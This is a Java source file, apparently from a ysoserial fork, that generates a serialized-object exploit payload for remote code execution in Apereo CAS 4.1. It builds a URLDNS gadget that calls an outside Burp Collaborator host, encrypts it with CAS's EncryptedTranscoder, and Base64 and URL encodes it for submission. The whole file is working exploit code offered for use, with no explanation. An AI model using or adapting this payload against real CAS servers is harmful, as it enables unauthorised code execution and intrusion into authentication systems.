package ysoserial.payloads;

import org.apereo.spring.webflow.plugin.EncryptedTranscoder;
import java.net.URLEncoder;
import java.util.Base64;
import java.util.UUID;

public class Apereo_CAS_4_1_RCE {
    public static void main( String[] args ) throws Exception
    {
        Object evil = new URLDNS().getObject("http://jh4swomwjuoqhd0f6or3oy62ctik69.burpcollaborator.net");
        String data = getPayload(evil);
        System.out.println(data);
    }
    public static String getPayload(final Object evil) throws Exception{
        String id = UUID.randomUUID().toString();
        EncryptedTranscoder et = new EncryptedTranscoder();
        byte[] code = et.encode(evil);
        String payload =  new String(Base64.getEncoder().encode(code));
        String data = URLEncoder.encode(id + "_" + payload, "UTF-8");
        return data;
    }
}
